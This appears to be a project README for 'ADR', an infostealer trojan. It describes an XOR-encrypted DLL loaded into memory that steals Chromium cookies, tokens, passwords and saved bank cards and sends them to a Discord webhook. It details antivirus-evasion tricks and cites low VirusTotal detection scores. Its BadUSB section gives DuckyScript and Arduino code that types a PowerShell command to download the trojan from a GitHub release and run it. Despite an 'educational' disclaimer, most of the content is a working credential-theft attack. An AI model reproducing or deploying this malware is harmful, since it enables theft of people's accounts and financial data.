# ADR 💥

ADR is a trojan that retrieves all information on the computer and all data stored in applications using chormium. It recovers cookies, tokens, passwords and saved bank cards. This malware is undetectable by Windows Defender, Chrome, Virustotal (~8/72).

> ⚠️ This project has a strictly educational objective. It aims to provide information, advice and resources in an educational context. I want to emphasize that I do not support or encourage any malicious or damaging use of this information. Any negative or abusive interpretation goes against the educational intent of this project. As the creator of this content, I accept no responsibility for any misuse that may arise from its use.


## loader

The loader is the entry program that will load ADR (the DLL that contains the malware).
The loader downloads the DLL online, this DLL is encrypted in XOR so as not to be detected by the antivirus. The DLL is then decoded and then injected into the memory of the process to execute the "main" function.

- download the DLL encode in XOR
- decode the XOR
- loading the DLL into memory (without using LoadLibraryA)
- execution of the "main" function of the ADR malware

The loader uses a few tricks to avoid being detected by anti-viruses, in particular:

- hiding suspicious functions using LoadLibrary and GetProcAddress (so imports are hidden and not visible in the executable)
- the masking of character strings, the url at which the payload is located, encrypt in XOR so as not to be readable in the executable directly
- optimization of compiler parameters and compression with UPX
- to make it possible to hide the imports even more, if we do not have an executable heavier in KB, we can change the Runtime Library. Indeed, switching from Multi-threaded DLL mode (/MD) to Multi-threaded mode (/MT) hides all imports (with UPX). However, it takes about 40 KB more than the Multi-threaded DLL version.

## payload

The payload is compiled in DLL, encoded in XOR, then uploaded to a server to be loaded later by the loader.
the main function is the entry point of the malware, this function aims to:

- scan Windows AppData folder for folder using Chromium file structure
- recover all cookies, tokens, passwords, local state, credit card, history and autocompletion
- find all the information on the machine used
  - MAC Address
  - Public IP
  - Processor
  - Architecture
  - Storage
  - Local Time
  - Language
  - Machine Name
- all this data is then compressed into a Zip file which will be sent to a discord webhook (obviously this data can be sent to any public server or webhook).

## go loader

go loader is the Golang version of the loader. With this version we reached the score of 4/71 detection on virustotal. This results and largely due to the obfuscator: garble, which allowed this incredible result. The golang code does not change much from the C version, loading the DLL into memory reuses the C code from the loader and is compiled with CGO.

> why no compression with UPX?

gARD will not decompress with UPX because it is much more detectable with compression enabled. The goloader.exe pyaload is therefore heavier (5 MB).

> Compile with Garble

```cmd
@REM install it: go install mvdan.cc/garble@latest
@REM build:

build.bat
```

## AntiVirus Detection

|     Name      |                         ✅                         |                         ❌                         |          ❔           |
| :-----------: | :------------------------------------------------: | :------------------------------------------------: | :-------------------: |
| payload (xor) | Windows Defender, Chrome AV, Manalyzer, Virustotal |                                                    |                       |
| pyload (dll)  |                         -                          | Virustotal, Windows Defender, Chrome AV, Manalyzer |           -           |
| loader (exe)  |            Windows Defender, Chrome AV             |                         -                          | Virustotal, Manalyzer |
|  loader (go)  |            Windows Defender, Chrome AV             |                Virustotal,Manalyzer                |           -           |

## UPX Compression

ADR files are compressed with UPX to reduce the size of the payload.

|     Name     | Runtime Lib |  Size  | Compressed Size |
| :----------: | :---------: | :----: | :-------------: |
| pyload (dll) |     /MD     | 15 ko  |      10 ko      |
| loader (exe) |     /MT     | 114 ko |      54 ko      |
| loader (exe) |     /MD     | 17 ko  |     10.5 ko     |



## Bonus BadUSB

**Digispark Rev.3 Kickstarter with Attiny85 and USB compatible with Arduino**

You can buy it [here](https://www.az-delivery.de/en/products/digispark-board).

> DuckyScript

```
DELAY 1000
GUI r
DELAY 200
STRING powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/julesgrc0/ADR/releases/download/0.0.3/bADR.exe','%userprofile%\ADR.exe');(New-Object -com shell.application).shellexecute('%userprofile%\ADR.exe');exit"
ENTER
```

> Arduino C/C++ Code

```cpp
#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


void setup()
{
  Keyboard.begin();
  delay(500);

  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("powershell -command \"(New-Object Net.WebClient).DownloadFile('https://github.com/julesgrc0/ADR/releases/download/0.0.3/bADR.exe','%userprofile%\\ADR.exe');(New-Object -com shell.application).shellexecute('%userprofile%\\ADR.exe');exit\""));

  typeKey(KEY_RETURN);

  Keyboard.end();
}

void loop() {}
```
